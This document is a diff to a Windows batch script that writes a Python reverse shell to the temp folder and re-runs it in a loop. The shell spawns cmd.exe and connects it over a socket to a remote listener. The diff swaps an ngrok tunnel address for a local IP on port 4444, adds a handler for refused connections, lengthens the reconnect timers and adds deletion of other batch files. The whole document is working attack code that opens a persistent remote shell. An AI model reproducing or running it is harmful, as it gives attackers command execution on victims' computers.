@@ -1,4 +1,6 @@
 @echo off
+del %temp%\rev.bat
+del %temp%\vb.bat
 :loop
 set FILE=%temp%\sh.py
 if not exist %FILE% (
@@ -12,7 +14,12 @@ if not exist %FILE% (
         echo def rev^(^)^:
         echo    p = sp.Popen^(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT^)
         echo    s = socket.socket^(^)
-        echo    s.connect^(('4.tcp.eu.ngrok.io', 19814^)^)
+        echo.
+        echo    try:
+        echo        s.connect^(^('192.168.1.16', 4444^)^)
+        echo    except ConnectionRefusedError as e:
+        echo        print^('refused ... Check if listener is running.'^)
+        echo        return
         echo.
         echo    def s_o^(^)^:
         echo        while True^:
@@ -40,7 +47,7 @@ if not exist %FILE% (
         echo    threading.Thread^(target=s_o, daemon=True^).start^(^)
         echo    threading.Thread^(target=r_i, daemon=True^).start^(^)
         echo.
-        echo    time.sleep^(20^)
+        echo    time.sleep^(30^)
         echo.
         echo while True^:
         echo    rev^(^)
@@ -48,6 +55,6 @@ if not exist %FILE% (
     ) > %FILE%
 ) else (
    python3 %FILE%
-   timeout /t 20 >nul
+   timeout /t 60 >nul
 )
 goto loop
